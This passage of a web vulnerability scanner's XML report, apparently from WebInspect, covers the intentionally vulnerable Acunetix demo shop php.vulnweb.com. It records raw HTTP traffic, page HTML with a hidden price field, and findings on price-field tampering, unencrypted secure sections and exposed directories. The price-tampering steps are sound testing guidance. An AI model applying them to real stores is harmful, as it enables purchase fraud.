      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:37 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5056</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="5F9905BD02E1BB70F1922374691D86AB"><URL>http://php.vulnweb.com:80/product.php?pic=2</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="1454cfb3-00a2-4eef-bc8a-6616e51441d8"><CheckTypeID>Info</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>10280</VulnerabilityID><Severity>0</Severity><Name>Price-Related Form Fields</Name><Classifications><Classification kind="CWE" identifier="CWE-472" href="http://cwe.mitre.org/data/definitions/472.html">CWE-472: External Control of Assumed-Immutable Web Parameter</Classification><Classification kind="7PK" identifier="API Abuse" href="https://vulncat.fortify.com/">API Abuse</Classification><Classification kind="7PK Category" identifier="Often Misused: Price-Related Fields" href="https://vulncat.fortify.com/">Often Misused: Price-Related Fields</Classification></Classifications><DetectionSelection><Location offset="3778" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Form fields with price-related field names have been discovered.  Such fields could harbor price manipulation vulnerabilities which would allow the attacker to change the indicated field value (i.e. the price of the product) and commit fraud.  Recommendations including manually verifying whether the field is subject to a price manipulation vulnerability, and if so, re-architecting the application to not require the price be provided by the user.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Passing a product's price via a form field allows the user/attacker to specify an arbitrary price for the product.  This can result in fraud and financial loss due to incorrect product pricing.  In certain circumstances, a negative product price may actually credit the attacker's account in the process.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
Using a Web Proxy tool, browse to the affected page and intercept the submission of the form with the target form field and change the price value of that field.  Continue the form submission and purchase process to verify if the product price reflects the maliciously changed price.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Developers:</b><br />
Product prices should not be supplied to users via form fields.  Ideally all the information will be kept in server-side session storage.  However, in certain circumstances, that may not be possible.  An alternative is to provide the user only with an item identifier and perform server-side lookups of the associated price for that identifier when necessary.  This way the price is strictly controlled by the value retrieved from the server-side database.
<br /><br /><b>For QA:</b><br />
Follow the instructions listed in Execution to test whether a price manipulation vulnerability exists.  If one is suspected of existing, you will need to contact the appropriate vendor or development team to modify the application in order to fix the vulnerability.
<br /><br /><b>For Security Operations:</b><br />
Follow the instructions listed in Execution to test whether a price manipulation vulnerability exists.  If one is suspected of existing, you will need to contact the appropriate vendor or development team to modify the application in order to fix the vulnerability.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>CWE 472 - Web Parameter Tampering</b><br /><a href="http://cwe.mitre.org/data/definitions/472.html">http://cwe.mitre.org/data/definitions/472.html</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="5F9905BD02E1BB70F1922374691D86AB"><![CDATA[GET /product.php?pic=2 HTTP/1.1
Referer: http://php.vulnweb.com/listproducts.php?cat=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="5F9905BD02E1BB70F1922374691D86AB";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="2d2bfe2a";
X-Request-Memo: ID="d8771dcc";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:51 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6368

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Mistery</h2><div class='story'><p><a href='showimage.php?file=./pictures/2.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/2.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Donec molestie.
Sed aliquam sem ut arcu.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $800</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='800'><input type='hidden' name='addcart' value='2'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="5F9905BD02E1BB70F1922374691D86AB"><Method>GET</Method><Path>/</Path><File>product</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>pic=2</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>pic</Name><Value>2</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/listproducts.php?cat=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="5F9905BD02E1BB70F1922374691D86AB";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="2d2bfe2a";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="d8771dcc";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Mistery</h2><div class='story'><p><a href='showimage.php?file=./pictures/2.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/2.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Donec molestie.
Sed aliquam sem ut arcu.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $800</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='800'><input type='hidden' name='addcart' value='2'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:51 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6368</Value></Header></Headers><SetCookies /><Forms><Form><Action>cart.php</Action><Method>POST</Method><Name>f_addcart</Name><OnSubmit /><InputFields><InputField><Name>price</Name><Value>800</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>addcart</Name><Value>2</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name /><Value>add this picture to cart</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="990B9CEB1864EF8E567D50B3C27D5823"><URL>http://php.vulnweb.com:80/secured/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="69fe8ef2-9b9a-41a6-9b5e-d71164335be9"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>4726</VulnerabilityID><Severity>3</Severity><Name>Secure Section Must Require SSL Access</Name><Classifications><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Insecure Transport: Secure Section Access Not SSL-" href="https://vulncat.fortify.com/">Insecure Transport: Secure Section Access Not SSL-Enabled</Classification><Classification kind="CWE" identifier="CWE-311" href="http://cwe.mitre.org/data/definitions/311.html">CWE-311: Missing Encryption of Sensitive Data</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[This policy states that any area of the website or web application that contains sensitive information or access to privileged functionality such as remote site administration requires that the pages under the secure section of the site are only accessible via SSL. This scan has detected that the URL<b> ~FullURL~ </b>has failed this policy.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[Failure to conform with this policy could expose the content of the secure directory to unauthorized parties either through interception during cleartext trasmission or via unencrypted storage in log files.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
The check looks for URLs containing values in this check's associated check input (named "Secure Section"). The check input can be configured to contain multiple string patterns for directories containing secure content. A vulnerability will be flagged if there is a discovered URL whose path contains any of the values indicated in the check input and  either of the following two conditions is met <br /> 1. The URL is accessible over a non SSL connection or <br /> 2. In addition to being served over an SSL connection, the URL is also accessible over HTTP ( the check tries to force a non-SSL request to the URL being tested and checks for a valid response).
<br /><br />
It is important to note that you must configure the "Secure Section" check input for this check appropriately for your site, if applicable.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Ensure that secure content is not served over non-SSL tunnels.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>OWASP:</b><br /><a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet">Transport Layer Protection Cheat Sheet</a>]]></SectionText></ReportSection></Issue><Issue id="a772e0a8-4915-49fa-85f1-f6051012a71c"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10</EngineType><AttackHTTPRequest><![CDATA[GET /secured/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="990B9CEB1864EF8E567D50B3C27D5823";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10233";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="e69fb3a9";
X-Request-Memo: ID="da3fbe99";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10233</VulnerabilityID><Severity>1</Severity><Name>Restricted Access Directories</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Directories that may be restricted to only certain users were discovered within your web application during a Directory Enumeration scan. Risks associated with an attacker discovering a directory on your application server depend upon what type of directory is discovered, and what types of files are contained within it.  The primary threat, other than accessing files containing sensitive information, is that an attacker can utilize the information discovered in that directory to perform other types of attacks.  Recommendations include restricting access to important directories or files by adopting a "need to know" requirement for both the document and server root, and turning off features such as Automatic Directory Listings that provide information that could be utilized by an attacker when formulating or conducting an attack. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
You should evaluate the production requirements for the found directory.  If the directory is not required for production operation, then the directory and its contents should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.  Automatic directory indexing should also be disabled, if applicable.

<br /><br /><b>For Development:</b><br />
This problem will be resolved by the web application  server administrator.  In general, do not rely on 'hidden' directories within the web root that can contain sensitive resources or web applications.  Assume an attacker knows about the existence of all directories and files on your web site, and protect them with proper access controls.

<br /><br /><b>For QA:</b><br />
This problem will be resolved by the web application  server administrator.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Implementing Basic Authentication in IIS</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/abbca505-6f63-4267-aac1-1ea89d861eb4.mspx">http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/a

bbca505-6f63-4267-aac1-1ea89d861eb4.mspx</a><br /><br /><b>Implementing Basic Authentication in Apache</b><br /><a href="http://httpd.apache.org/docs/howto/auth.html#intro">http://httpd.apache.org/docs/howto/auth.html#intro</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="990B9CEB1864EF8E567D50B3C27D5823"><![CDATA[GET /secured/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="990B9CEB1864EF8E567D50B3C27D5823";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10233";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="e69fb3a9";
X-Request-Memo: ID="da3fbe99";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:16 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="990B9CEB1864EF8E567D50B3C27D5823"><Method>GET</Method><Path>/secured/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="990B9CEB1864EF8E567D50B3C27D5823";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10233";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="e69fb3a9";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="da3fbe99";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

